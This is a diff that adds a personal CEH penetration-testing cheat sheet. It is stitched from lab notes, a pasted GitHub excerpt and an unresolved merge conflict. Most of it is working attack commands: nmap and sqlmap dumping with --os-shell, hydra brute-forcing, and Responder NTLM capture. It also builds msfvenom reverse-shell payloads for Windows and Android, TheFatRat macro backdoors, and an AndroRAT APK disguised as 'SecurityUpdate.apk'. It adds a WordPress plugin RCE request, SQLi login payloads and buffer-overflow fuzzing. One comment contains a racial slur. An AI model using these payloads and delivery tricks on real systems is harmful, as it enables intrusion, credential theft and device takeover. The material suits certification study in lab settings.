@@ -1,0 +1,1097 @@
+quick command 2 
+
+
+
+CEH
+	•  Footprinting
+	•  Scanning
+	•  Enumeration
+	•  Vulnerability Analysis
+	•  System Hacking ** Gaining Access **
+	•  Cracking passwords
+	•  Vulnerability Exploitation ** Escalating Privileges ** ** Maintaining Access **
+	•  Executing Applications
+	•  Hiding Files ** Clearing Logs **
+	•  Covering Tracks
+Online Resources
+	• Ethical hacking labs writeup - git
+Enumeration
+host enumation
+host and service enumeration
+//discover devices inside the network eth0
+netdiscover -i eth0
+nmap -sN 10.10.10.0/24
+// enumeration
+netstat -a 10.10.10.10 // netstat enumeration netbios
+snmp-check 10.10.10.10 // extract users from netbios - parrot
+enum4linux
+sudo nmap -vv -p 1-1000 -sC -A 10.10.10.10 -oN nmap_scan
+nmap -p- -sS -min-rate 10000 -Pn -n 10.10.10
+nmap -6 www.scanme.com // scan IPV6
+nmap -sC -sV -vvv -T5 -p 80,21,2222 10.10.10
+sudo nmap -v -sV -sC
+nmap -Pn -sS -n 10.10.. -T4 -oN nmap_scan // [prefer] fast scan ufo mode
+nmap -v -p- -sV -sC -T4 10.10 -oN nmap_scan // UDP/TCP scanning
+sudo nmap -p- -Pn -vvv -sS 10.10.. -oN nmap_scan
+nmap -sS -sV -A -O -Pn
+nmap -sV -sT -sU -A 10.10.. -oN nmap_scan
+sudo nmap -p- 10.10.. --open -oG nmap/AllPorts -vvv -Pn -n -sS
+sudo nmap -p22,80 -sV -sC -Pn -n 10.10.. -oN nmap/openports -vvv
+nmap -sV -p 22,443 10.10../24 // scan mi net 24
+nmap -sU -p 161 -sV -sC 10.10.. // UDP Scan
+nmap -A --min-rate=5000 --max-retries=5 10.10.. // optimize scan time
+<<<<<<< HEAD
+nmap -Pn -sS -A -oX test 10.10.10.0/24 // Scanning the network and subnet
+-PR = ARP ping scan
+-PU = UDP ping scan
+=======
+nmap -Pn -sS -A -oX test 10.10.../24 // scanning network subnet
+//scripts
+snmp //extract users of the network port 161
+-PR = ARP ping scan
+-PE = ICMP scan echo
+-PU = UDP ping scan
+-oX = save XMl
+>>>>>>> df364a4f409faf7bc6bb4b291db58d3dcabb2bb9
+-vv = verbose
+-p = ports
+-sC = default scripts
+-A = agressive scan
+-oN = save in a file
+-sS = syn scan is untrusive because don't complete the petitions
+-n = no resolution of dns
+-p- = all ports
+-sV = Probe open ports to determine service/version inf
+-T4 = Timing scanning <1-5>
+-o = output to save the scan
+-sT = TCP port scan
+-sU = UDP port scan
+-A = Agressive/ OS detection  
+--open = all ports open
+-oG = save in a grep format
+-Pn = no do ping to the ip
+-n = dont resolve domain names
+--max-retries = 1 default verify 10 times.
+-O = verifica el sistema operativo
+// My niggerian methodology
+nmap -sV -sC nmap 10.10.10.x #top1000ports
+nmap -sC -sV -v -oN nmap.txt
+masscan -e tun0 -p1-65535 -rate=1000 <ip>
+sudo nmap -sU -sV -A -T4 -v -oN udp.txt ip
+default ports
+port	name
+3306	mysql --script mysql-info mysql-enum
+3389	rdp port remote port
+25	smtp mail
+80	http
+443	https
+20	ftp
+23	telnet
+143	imap
+22	ssh
+53	dns
+Web Enumeration
+// dir enumeration
+gobuster dir -u 10.10.. -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q
+dir : directory listing
+-u : host
+-w : wordlists
+-t : threads int / Number of concurrent threads (default 10)
+-x : enumerate hidden files htm, php
+-q : –quiet / Don’t print the banner and other noise
+// wordpress enumeration
+wpscan --url https://localchost.com --passwords=
+wpscan -u 10.10.. -e u vp
+wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce
+-e = enumerate
+u = enumerate usernames
+vp = vulnerable plugins
+// wordlist generation
+cewl -w wordlist -d 2 -m 5 http://wordpress.com
+-d = deeph of the scanning
+-m = long of the words
+-w = save to a file worlist
+web explotation
+// sql injection
+sqlmap -u http://10.10.197.40/administrator.php --forms --dump
+-u = url
+--forms = grab the forms /detect
+--dump = retrieve data form de sqli
+#### basic sqli injection
+sqlmap -u 10.10.77.169 --forms --dump
+- u = url
+- --forms= check the forms automatically
+- --dump= dump dthe database data entries
+// extract database
+sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
+// extract colums
+Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
+// extract data of the table and the column inside of the db
+sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
+enumeration
+enum4linux 10.10.60.11
+bruteforcing
+hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
+hydra -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.118
+stego
+exiftool cats.png
+zsteg cats.png
+binwalk -d cats.png
+// windows
+snow -C -p "magic" readme2.txt
+-p = passowrd
+//image steganography
+openstego > extract dat > 
+//stegseek to crack stego password
+windows rpc mal configurado
+rpcclient 10.10.123.10
+hashcracking
+hashcat
+hashcat -O -w3 -m 0 56ab24c15b72a457069c5ea42fcfc640 /usr/share/wordlists/rockyou.txt --show
+-m = type of hash
+-a = attack mode (1-3) 3 bruteforcing
+--show = mostrar hash crackeado
+hashcat -O -A 0 -m 20 salt12314124:passowrdmd523432 /usr/share/worlist/rockyou.txt
+hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --show
+john
+john --format=Raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt
+- --format = hash format '--list=formats | grep MD5'
+- hash = file - echo '123213dasd' >> hash
+- wordlist= = wordlist to crack
+### to show the hash cracked
+john --show --format=Raw-MD5 hash
+- --show = show the hash:Cracked
+cryptography
+//HashCalc
+take a file and open into hashcalc
+i will give you the the hash for md5 or other algorithms
+// MD5 calculator
+it will compare both files what we need get the md5
+// HashMyFiles
+it allow you to hash all the files inside a folder
+// Veracrypt
+rainbowtables
+Rainbowtables are already hash with password to perform cracking without calculate a new hash.
+// linux
+rtgen // rainbowcrack
+rtgen sha256 loweralpha-numeric 1 10 0 1000 4000 0 // generate a new rainbow table
+// windows
+rtgen md5 loweralpha-hnumeric 1 4 1 1000 1000 0 //
+then use app rainbowcrack // add the hashes and the rainbow table option
+enumerating -samba
+search for commands
+smbmap --help | grep -i username
+smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
+-x = command
+wireshark
+### wireshark filters
+// filters by post
+http.request.method==POST
+smtp // email
+pop // email
+dns.qry.type == 1 -T fields -e dns.qry.name = show records present in this pcap
+dns.flags.response == 0 = There are 56 unique DNS queries.
+tcp // show tcp packets
+//find packets
+edit > find packets > packet list : packet bytes > case sensitive: strings > string "pass" :search
+//DDOS ATTACK
+look number of packets first column
+then >statistics > ipv4 statistics > destination and ports
+/// tshark cli
+tshark -r dns.cap | wc -l //count how many packets are in a capture
+tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name //show records present in this pcap
+tshark -r dnsexfil.pcap -Y "dns.flags.response == 0" | wc -l 
+tshark -r pcap -T fields -e dns.qry.name | uniq | wc -l //There are 56 unique DNS queries.
+tshark -r pcap | head -n2 //DNS server side to identify 'special' queries
+tshark -r pcap -Y "dns.flags.response == 0" -T fields -e "dns.qry.name" | sed "s/.m4lwhere.org//g" | tr -d "\n" `exfiltrate data with regx`
+Privilege scalation reverse shell
+ssh -p 2222 mith@10.10.123.23
+sudo -ls ###list de su permisions
+sudo vim -c ':!/bin/sh' ### privilege scalation
+https://gtfobins.github.io/
+other
+hydra -l root -P passwords.txt [-t 32] ftp
+hydra -L usernames.txt -P pass.txt mysql
+hashcat.exe -m hash.txt rokyou.txt -O
+nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 0.10.10 
+wpscan --url https://10.10.10.10 --enumerate u
+netdiscover -i eth0
+john --format=raw-md5 password.txt [ To change password to plain text ]
+vulnerability scanning
+nikto -h url -Cgidirs all
+System hacking
+// 1 - on a windows machine
+wmic useraccount get name,sid //list users
+// using a tool
+Pwdump7.exe >> /path/file.txt //get a file to crack
+// using ophcrack to crack the hash with rainbow tables
+ophcrack >> tables >> vista free
+// cracking with rainbow tables using winrtgen to create a rainbow table
+winrtgen >> add table >> hashntlm
+rainbowcrack >> select the obtained file >> select dircreatd with winrtgen
+// 2 - using responder to capture the traffic of the windows system
+//run a shared folder on windows
+//capture the ntlm hash >> cracking with jhon
+chmod +x responder.py
+./Responder.py -I eth0
+-I = interface //ifconfig
+// cracking the ntlm capture with ntlm
+john capture.txt
+lopthcr4ck // helps to crack ntlm passwords store on windows
+// system hacking windows
+// look for an exploit and try to get remote access to the victim using msfvnom,metasploit and rat
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=my.ip LPORT=my.port -o /root/Desktop/test.exe
+-p = payload
+--platform = Os
+-a = architecture
+-f = format of the payload
+-o = output dir
+// now with try to share the file with the victim
+// we try three forms
+// #1 - option
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+// copy the text.exe to the new server
+cp /root/Desktop/test.exe /var/www/html/share
+// #2 - option
+python -m SimpleHttpServer 80
+// #3 - option
+python3 http.server 80
+// start the serverwith apache
+service apache2 start //apache version
+//now we open msfconsole to gain a inverse shell with meterpreter
+use exploit/multi/handler //similar to nc -nlvp .port
+set payload windows/meterpreter/reverse_tcp
+set LHOST my.ip
+set LPORT my.port
+exploit/run // run the exploit
+//share the file with the victim
+my.ip/share
+//inside the victim's machine
+run the exe // text.exe share with the server
+//look at the metasploit session
+sysinfo // system info
+//now with try to enumerate to know misconfigurations on the w10 system
+//using PowerSploit
+upload /path/PowerUp.ps1 powerup.ps1 // with meterpreter
+shell // with shell with change from meterpreter to windows shell
+// now we execute powerup
+powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
+// now we know that windows is vulnerable to dll injection
+// change to meterpreter shell with exit & run
+run vnc // will open a VNC remote control on the victim
+// Now we will try another method to gain access to a machine
+// with TheFatRat
+chmod +x fatrat
+chmod +x setup.sh
+chmd +x powerfull.sh
+./setup.sh
+//run fatrat
+option 6 // create fud.. [Excelent]
+option 3 // create apache + ps1
+//put the lhost and lport
+enter the name for files : payload
+option 3 // for choosing meterpreter/reverse_tcp
+// payload generated
+option 9 // back to the menu
+option 7 // create a back office
+option 2 // macro windows and select lhost and lport
+// enter the name for the doc file
+// use custom exe backdoor Y
+option 3 // reverse_tcp 
+// backdoor inside the doc generate
+// share document with the server option 1 and 2 above
+// start msfconsole to gain meterpreter shell
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST my.ip
+set RHOST my.port
+exploit / run 
+Mobile Hacking
+// create a backdoor with msfvenom
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=my.ip R > path/backdoor.apk
+// share with some of the three methods above
+// now with metasploit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST my.ip
+exploit -j -z // exploit with a background job
+// install the apk in android & the session will open
+sessions -i 1 // will display the meterpreter
+sysinfo // to know the os
+// Using PhoneSploit
+run phonesploit
+option 3 // new phone
+enter the ip // ip' phone &
+option 4 // to shell on the phone
+//in the menu you can search, download, info
+Using the methodology
+	1. netdiscover -i eth0
+	2. map -p- 10.10.10.10 [ Any IP ] port discovery
+	3. nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10
+	4. gobuster -e -u** http://10.10.10.10 -w wordlsit.txt on a webserver running
+	5. trying sqli payloads on the forms
+admin' --  
+admin' #  
+admin'/*  
+' or 1=1--  
+' or 1=1#  
+' or 1=1/*  
+') or '1'='1--  
+') or ('1'='1—
+
+	1. bruteforcing web servers
+hydra -l root -P passwords.txt [-t 32] <IP> **_ftp_**
+hydra -L usernames.txt -P pass.txt <IP> **_mysql_**
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> **_pop3_** -V
+hydra -V -f -L <userslist> -P <passwlist> **_rdp_**://<IP>
+hydra -P common-snmp-community-strings.txt target.com **_snmp_**
+hydra -l Administrator -P words.txt 192.168.1.12 **_smb_** -t 1
+hydra -l root -P passwords.txt <IP> **_ssh_**
+	1. cewl example.com -m 5 -w words.txt custom wordlist
+	2. search for vulns
+searchsploit 'Linux Kernel'
+searchsploit -m 7618 // Paste the exploit in the current directory
+searchsploit -p 7618[.c] // Show complete path
+searchsploit — nmap file.xml // Search vulns inside a Nmap XML result
+
+From <https://github.com/TheCyberpunker/CEH-Practical-Notes/blob/main/8%20-%20CEH-Notes.md> 
+-------
+
+
+
+Detect Web Application Vulnerabilities using Wapiti Web Application Security Scanner
+The Wapiti web-application vulnerability scanner identifies security weaknesses in web applications by crawling websites and performing black-box testing. It detects issues like SQL injections, XSS, and other vulnerabilities.
+Parrot 
+cd wapiti
+python3 -m venv wapiti3 command to create virtual environment in python.
+run . wapiti3/bin/activate command to activate virtual environment.
+Run pip install . command to install wapiti web application security scanner.
+ wapiti -u https://site.com command to perform web application security scanning ., notramlly take 10 min
+cd /root/.wapiti/generated_report/
+
+ls command to view the contents of the directory
+cp certifiedhacker.com_xxxxxxxx_xxxx.html /home/attacker/ command to copy the .html file to /home/attacker location.
+29. Open a new terminal and run firefox certifiedhacker.com_xxxxxxxx_xxxx.html command to open the .html file in Firefox browser.
+
+Wapiti scan report opens upp in Firefox browser
+
+
+
+
+RCE attack 
+
+Wampserver64 search and wait till running server 
+go to browser  http://10.10.1.22:8080/CEH/wp-login.php? login if you dont have login details first find out 
+install plugin and activate user post gallery 
+go ot parrot security
+web browser and go to https://wpscan.com/ login click the Get Started button and click Start for free button under Researcher section.
+The Edit Profile page appears; in the API Token section and observe the API Token. Note down or copy this API Token; we will use this token in the later steps.
+run wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token from Step#13] command.
+Unauthenticated Remote Code Execution (RCE) vulnerability has been detected as shown in the screenshot.
+RCE vulnerability present in the wp-upg plugin
+To perform RCE attack, run curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' command.
+This curl command exploits a WordPress plugin vulnerability by sending a malicious request to the admin-ajax.php file, allowing an attacker to execute arbitrary system commands via the exec function, potentially leading to remote code execution.
+In the last step, whoami command was executed, yielding the outcome nt authority\ \system
+
+
+
+
+Bruteforce via burpsuit
+
+Wampserver64 search and wait till running server
+Parrot 
+web browser and go to http://10.10.1.22:8080/CEH/wp-login.php?.
+set proxy 127.0.0.1 
+open burpsuite go to proxy ,intercept on 
+http://10.10.1.22:8080/CEH/wp-login.php?  login 
+check logs 
+
+
+
+Perform Web Spidering using OWASP ZAP
+OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications. It offers automated scanners as well as a set of tools that allow you to find security vulnerabilities manually. ZAP provides functionality for a range of skill levels-from developers to testers new to security testing, to security testing specialists.
+
+
+
+perform web spidering on the target website using OWASP ZAP.
+
+Sudo su 
+Zaproxy  to luanch
+
+
+SmartScanner leverages machine learning (ML) and artificial intelligence (AI) techniques to adapt its methodologies to the behavior of the target. This integration allows SmartScanner to minimize false positives. It uses AI for identifying vulnerable pages, detecting 404 custom pages, identifying input vectors, fingerprinting the target and calculating the security risk. 
+
+
+Launc and sacan
+
+can also use other web application vulnerability scanning tools such as WPScan Vulnerability Database (https://wpscan.com), Codename SCNR (https://ecsypno.com), AppSpider (https://www.rapid7.com), Uniscan (https://github.com) and N-Stalker (https://www.nstalker.com).
+
+
+
+SQL injection attacks can be performed using various techniques to view, manipulate, insert, and delete data from an application's database. There are three main types of SQL injection:
+• In-band SQL injection: An attacker uses the same communication channel to perform the attack and retrieve the results
+• Blind/inferential SQL injection: An attacker has no error messages from the system with which to work, but rather simply sends a malicious SQL query to the database
+• Out-of-band SQL injection: An attacker uses different communication channels (such as database email functionality, or file writing and loading functions) to perform the attack and obtain the results
+
+
+Perform an SQL injection attack against MSSQL to extract databases using sqlmap
+Parrot 
+http://site/ login to site , click view profile , inspect q 
+type document.cookie in the lower-left corner of the browser. and copy complete message 
+Run sqlmap -u "http://site.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#7]" --dbs command.
+In this query, -u specifies the target URL (the one you noted down in Step#7), --cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases.
+
+The above query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the  website. type y y 
+sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS, 
+Run sqlmap -u "http://www.site.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D site --tables command.
+qlmap retrieves the table contents of the site database and displays them, as shown in screenshot.
+need to retrieve the table content of the column User_Login.
+Run sqlmap -u "http://www.movie.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D site -T User_Login --dump command to dump all the User_Login table content.
+sqlmap -u "http://www.site.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell.
+In this query, --os-shell is the prompt for an interactive OS shell.
+Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell. Type hostname and press Enter to find the machine name where the site is running.
+sqlmap will retrieve the hostname of the machine on which the target web application is running
+Type TASKLIST and press Enter to view a list of tasks that are currently running on the target system
+
+Detect SQL Injection Vulnerabilities using OWASP ZAP
+
+	• Red Flag: High risk
+	• Orange Flag: Medium risk
+	• Yellow Flag: Low risk
+Blue Flag: Provides details about information disclosure vulnerabilities
+
+Wi-Fi Packet Analysis using Wireshark
+
+
+Wireshark is a network protocol sniffer and analyzer. It lets you capture and interactively browse the traffic running on a target network. Wireshark can read live data from Ethernet, Token-Ring, FDDI, serial (PPP and SLIP), and 802.11 wireless LAN. Npcap is a library that is integrated with Wireshark for complete WLAN traffic analysis, visualization, drill-down, and reporting. Wireshark can be used in monitor mode to capture wireless traffic. 
+
+
+Perform Wireless Attacks
+Crack a WPA2 network using Aircrack-ng
+
+run aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'. Here, the BSSID of the target is 22:7F:AC:6D:E6:8B.
+	• -a is the technique used to crack the handshake, 2=WPA technique.
+	• -b refers to bssid; replace with the BSSID of the target router.
+-w stands for wordlist; provide the path to a wordlist.
+
+
+
+
+Exploit the Android Platform through ADB using PhoneSploit-Pro
+
+sudo su
+cd PhoneSploit-Pro 
+python3 phonesploitpro.py 
+Type 1 and press Enter to select 1. Connect a Device option.
+type the target Android device's IP address
+go to next option type n 
+In the shell command line, type pwd and press Enter to view the present working directory on the target Android device.
+ls to view file present 
+cd sdcard - move to  cd directory
+27 to get device information 
+
+AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it.
+Parrot
+cd AndroRAT
+Run python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk command to create an APK file (here, SecurityUpdate.apk).
+	• --build: is used for building the APK
+	• -i: specifies the local IP address (here, 10.10.1.13)
+	• -p: specifies the port number (here, 4444)
+	• -o: specifies the output APK file (here, SecurityUpdate.apk)	
+You can observe that an APK file (SecurityUpdate.apk) is generated at the location /home/attacker/AndroRAT/
+Run cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/ command to copy the SecurityUpdate.apk file to the location share folder.
+	• Run mkdir /var/www/html/share command to create a shared folder
+	• Run chmod -R 755 /var/www/html/share command
+	• Run chown -R www-data:www-data /var/www/html/share command
+Execute service apache2 start command to start an Apache web server.
+run python3 androRAT.py --shell -i 0.0.0.0 -p 4444 command to start listening to the victim's machine.
+	• --shell: is used for getting the interpreter
+	• -i: specifies the IP address for listening (here, 0.0.0.0)
+	• -p: specifies the port number (here, 4444)
+ Interpreter session, type help 
+ You can also use other Android hacking tools such as hxp_photo_eye (https://github.com), Gallery Eye (https://github.com), mSpy (https://www.mspy.com), and Hackingtoolkit (https://github.com) to hack Android devices.
+
+
+
+
+
+
+Perform NetBIOS Enumeration using Windows Command-Line Utilities
+cmd -  nbtstat -a [IP address of the remote machine]  -  -a displays the NetBIOS name table of a remote computer
+nbtstat -c    - -c lists the contents of the NetBIOS name cache of the remote computer.
+
+Perform SNMP enumeration using SnmpWalk
+
+SNMP (Simple Network Management Protocol) is an application layer protocol that runs on UDP (User Datagram Protocol) and maintains and manages routers, hubs, and switches on an IP network.
+
+snmpwalk -v1 -c public [target IP]
+-v: specifies the SNMP version number (1 or 2c or 3) and -c: sets a community string.
+The result displays all the OIDs, variables and other associated information.
+snmpwalk -v2c -c public [Target IP Address]
+-v: specifies the SNMP version (here, 2c is selected) and -c: sets a community string.
+
+Perform LDAP Enumeration
+Connect ad
+
+Perform NFS enumeration using RPCScan and SuperEnum
+ NFS (Network File System) is a type of file system that enables computer users to access, view, store, and update files over a remote server. This remote data can be accessed by the client computer in the same way that it is accessed on the local system
+ Add Roles and Features Wizard and Expand File and Storage Services and select the checkbox for Server for NFS under the File and iSCSI Services option, as shown in the screenshot. Click Next.
+
+nmap -p 2049 [Target IP Address] - nfs 
+cd SuperEnum
+Run echo "10.10.1.19" >> Target.txt 
+execute ./superenum command. Under Enter IP List filename with path, type Target.txt, and press Enter.
+If you get an error running the ./superenum script, execute chmod +x superenum command,
+The script starts scanning the target IP address for open NFS and other services.
+perform NFS enumeration using RPCScan. To do so, run cd RPCScan command 
+python3 rpc-scan.py [Target IP address] --rpc
+Perform DNS Enumeration
+dig ns [Target Domain]
+On Linux-based systems, the dig command is used to query the DNS name servers to retrieve information about target host addresses, name servers, mail exchanges, etc
+dig @[NameServer] [Target Domain] axfr    -  axfr retrieves zone information.
+After retrieving DNS name server information, the attacker can use one of the servers to test whether the target DNS allows zone transfers or not. here, zone transfers are not allowed for the target domain; this is why the command resulted in the message: Transfer failed. A penetration tester should attempt DNS zone transfers on different domains of the target organization.
+DNS enumeration on Windows DNS servers
+execute command nslookup.
+set querytype=soa
+Type the target domain site.com
+set querytype=soa sets the query type to SOA (Start of Authority) record to retrieve administrative information about the DNS zone of the target domain
+In the nslookup interactive mode, execute command ls -d [Name Server] (here, the name is ns1.bluehost.com).
+In this command, ls -d requests a zone transfer of the specified name server.
+
+SMTP Enumeration using Nmap
+
+nmap -p 25 --script=smtp-enum-users [Target IP Address]  - The result appears displaying a list of all the possible mail users on the target machine
+
+nmap -p 25 --script=smtp-open-relay [Target IP Address]  - result appears displaying a list of open SMTP relays on the target machine
+nmap -p 25 --script=smtp-commands [Target IP Address] - A list of all the SMTP commands available in the Nmap directory appears. 
+Enumerate Information using Global Network Inventory -  scans single or multiple computers by IP range or domain, as defined by the Global Network Inventory host file.
+run the sgpt --shell “Perform NetBIOS enumeration on target IP 10.0.2.15” command to perform NetBIOS enumeration on the target system.
+sgpt --shell “Get NetBIOS info for IP 10.0.2.15 and display the associated names".
+ 
+
+
+-----------------------
+
+Perform Vulnerability Research in Common Weakness Enumeration (CWE)
+ https://cwe.mitre .org
+ 
+Perform Vulnerability Analysis using OpenVAS
+ 
+sudo su
+apt-get update && apt-get upgrade -y to automatically update the package index and upgrade all installed packages to their latest versions.
+apt-get install docker.io -y to install Docker in the ParrotOS.
+docker run -d -p 443:443 –-name openvas mikesplain/openvas to launch OpenVAS.
+open browser  https://127.0.0.1/ to go to the OpenVAS login page.
+Log in with username and password admin/admin
+
+Click on the Scans. Then Click on the Tasks
+The Task Wizard window opens; enter the target machine IP address in the IP address or hostname field. Then Click on the Start Scan button.
+
+sgpt --chat nikto --shell “Launch nikto to execute a scan against the URL https://www.certifiedhacker.com to identify potential vulnerabilities.”
+
+-----
+
+
+Perform an Active Online Attack to Crack the System’s Password using Responder
+
+
+
+---
+
+
+7
+7 Perform Process Monitoring using Process Monitor
+
+
+Process monitoring will help in understanding the processes that malware initiates and takes over after execution. You should also observe the child processes, associated handles, loaded libraries, functions, and execution flow of boot time processes to define the entire nature of a file or program, gather information about processes running before the execution of the malware, and compare them with the processes running after execution. This method will reduce the time taken to analyze the processes and help in easy identification of all processes that malware starts.
+
+
+
+
+Perform Port Monitoring using TCPView and CurrPorts
+
+
+You can identify the malware trying to access a particular port by installing port monitoring tools such as TCPView and CurrPorts.
+
+
+CPView TCPView is a Windows program that shows the detailed listings of all the TCP and UDP endpoints on the system, including the local and remote addresses, and the state of the TCP connections.
+
+
+CurrPorts CurrPorts is a piece of network monitoring software that displays a list of all the currently open TCP/IP and UDP ports on a local computer
+
+
+ Perform Static Malware Analysis
+ 
+ Perform Malware Scanning using Hybrid Analysis
+ 
+ Hybrid Analysis is a free service that analyzes suspicious files and URLs and facilitates the quick detection of unknown threats such as viruses, worms, Trojans, and other kinds of malware.
+
+
+, Google Chrome) and go to https://www.hybrid-analysis.com 
+ Drag & Drop For Instant Analysis section to upload a virus file.
+ 
+  Analyze ELF Executable File using Detect It Easy (DIE)
+  
+  
+  The Executable and Linkable Format (ELF) is a generic executable file format in Linux environment. It contains three main components including ELF header, sections, and segments. Each component plays an independent role in the loading and execution of ELF executables. The static analysis of an ELF file involves investigating an ELF executable file without running or installing it. It also involves accessing the binary code and extracting valuable artifacts from the program. Numerous tools can be used to perform static analysis on ELF files. In this task, we will be using Detect It Easy (DIE) tool to analyze ELF file.
+
+
+
+Detect It Easy (DIE) is an application used for determining the types of files. Apart from the Windows, DIE is also available for Linux and Mac OS. It has a completely open architecture of signatures and can easily add its own algorithms for detecting or modifying the existing signatures. It detects a file's compiler, linker, packer, etc. using a signature-based detection method.
+Detect It Easy automatically scans the file and result appears showing the Operating system, compiler and language details in the middle pane,
+
+
+Hash button from the top right corner of the window to view the information related to hash. Close the window after viewing the information.
+Click Entropy button from the top right corner of the window. Here, you can observe the status, size and graph of entropy. Close the window after viewing the Entrophy information.
+ MIME, Hex, Signatures and Demangle
+packaging/obfuscation tools such as Macro_Pack (https://github.com), UPX (https://upx.github.io), ASPack (http://www.aspack.com), or VMprotect (https://vmpsoft.com) to identify packing/obfuscation methods.
+
+
+
+Perform Malware Disassembly using IDA and OllyDbg  - upload .exe file fopr analysis
+
+
+Static analysis also includes the dismantling of a given executable into binary format to study its functionalities and features. This process helps identify the language used for programming the malware, look for APIs that reveal its function, and retrieve other information. Based on the reconstructed assembly code, you can inspect the program logic and recognize its threat potential. This process uses debugging tools such as IDA Pro and OllyDbg.
+
+new debugging option, "Set permanent breakpoints on system calls." When active, it requests OllyDbg to set breakpoints on KERNEL32.UnhandledExceptionFilter(), NTDLL.KiUserExceptionDispatcher(), NTDLL.ZwContinue(), and NTDLL.NtQueryInformationProcess().
+
+
+Gain Control over a Victim Machine using the njRAT RAT Trojan
+
+
+
+Create a Virus using the JPS Virus Maker Tool and Infect the Target System
+
+
+
+
+
+
+
+  
+----
+
+6
+
+Perform Active Online Attack to Crack the System's Password using Responder
+sudo responder -I eth0
+access file share from windows machine 
+Responder starts listening to the network interface for events
+cd /usr/share/responder/logs  
+pluma hash.txt  save it hash
+john hash.txt
+ 
+Gain Access to a Remote System using Reverse Shell Generator
+
+run docker run -d -p 80:80 reverse_shell_generator command to start Reverse Shell Generator
+	• docker run: Starts a new container.
+	• -d: Detached mode — runs the container in the background.
+	• -p 80:80: Maps host port 80 to container port 80, allowing access to the container's service via http://localhost.
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe -o reverse.exe
+
+		• msfvenom: Payload generation tool from the Metasploit Framework.
+		• -p windows/x64/meterpreter/reverse_tcp: Specifies a reverse TCP Meterpreter payload for 64-bit Windows.
+		• LHOST=10.10.1.13: IP address of the attacker's machine to receive the reverse shell.
+		• LPORT=4444: Port on the attacker's machine to listen for the connection.
+		• -f exe: Output format is a Windows executable.
+-o reverse.exe: Saves the payload as reverse.exe
+
+
+sudo apt install smbclient
+smbclient //10.10.1.11/Share -U user
+put movie.mp4
+
+
+got access - getuid
+
+will gain access to the remote system using PowerShell script
+
+HoaxShell section, select PowerShell IEX
+ pluma shell.ps1  save content and transfer to windows 
+ 
+ un a hoaxshell listener, to do so, switch to the Firefox browser and ensure the port number is 444, select hoaxshell from the Type drop-down under Listener section and click on Copy to copy the code..
+ 
+ Switch to the terminal window and paste the copied code to start the listener AND got access
+ 
+ Perform Buffer Overflow Attack to Gain Access to a Remote System
+ 
+ A buffer is an area of adjacent memory locations allocated to a program or application to handle its runtime data. Buffer overflow or overrun is a common vulnerability in applications or programs that accept more data than the allocated buffer. This vulnerability allows the application to exceed the buffer while writing data to the buffer and overwrite neighboring memory locations
+ 
+ ImmunityDebugger
+  attach vul.exe file 
+  Netcat command to establish a connection with the target vulnerable serve
+  
+  	23. Execute nc -nv 10.10.1.11 9999 command.
+Here, 10.10.1.11 is the IP address of the target machine (Windows 11) and 9999 is the target port.
+	28. To create a spike template for spiking on the STATS function, run pluma stats.spk command to open a text editor.
+	29. In the text editor window, type the following script:
+s_readline();
+s_string("STATS ");
+s_string_variable("0");
+generic_send_tcp 10.10.1.11 9999 stats.spk 0 0 command to send the packages to the vulnerable server.
+Here, 10.10.1.11 is the IP address of the target machine (Windows 11), 9999 is the target port number, stats.spk is the spike_script, and 0 and 0 are the values of SKIPVAR and SKIPSTR.
+
+
+In the text editor window, type the following script:
+s_readline();
+s_string("TRUN ");
+s_string_variable("0");
+
+run generic_send_tcp 10.10.1.11 9999 trun.spk 0 0 command to send the packages to the vulnerable server.
+Here, 10.10.1.11 is the IP address of the target machine (Windows 11), 9999 is the target port number, trun.spk is the spike_script, and 0 and 0 are the values of SKIPVAR and SKIPSTR.
+
+--
+ run python3 /home/attacker/converter.py command.
+This script will ask assembly code as input.
